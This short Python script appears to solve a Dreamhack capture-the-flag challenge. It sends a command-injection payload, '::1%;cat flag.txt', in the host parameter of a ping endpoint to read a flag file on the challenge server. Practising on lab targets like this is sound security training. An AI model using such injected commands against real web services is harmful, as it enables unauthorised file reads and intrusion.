import requests

payload = "::1%;cat flag.txt"

base_url = "http://host8.dreamhack.games:14453/ping"
url = f"{base_url}?host={payload}"

final_url = "http://host8.dreamhack.games:14453/ping?host=::1%;cat flag.txt"
res = requests.get(url, timeout=10)

print(res.text)


